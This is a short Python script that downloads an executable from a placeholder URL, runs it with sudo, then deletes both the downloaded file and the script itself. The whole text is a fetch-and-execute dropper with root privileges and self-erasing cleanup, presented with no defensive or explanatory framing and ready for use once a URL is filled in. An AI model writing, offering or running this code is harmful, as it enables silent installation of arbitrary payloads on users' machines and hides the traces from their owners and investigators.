import os
import subprocess

# Replace the URL with the URL of the file you want to download
url = "https://example.com/file.exe"

# Download the file
os.system(f"wget {url}")

# Get the file name
file_name = url.split("/")[-1]

# Make the file executable
os.system(f"chmod +x {file_name}")

# Execute the file as an administrator
subprocess.run(["sudo", "./" + file_name])

# Delete the file
os.system(f"sudo rm -f {file_name}")

# Delete the script
os.system(f"sudo rm -f {__file__}")
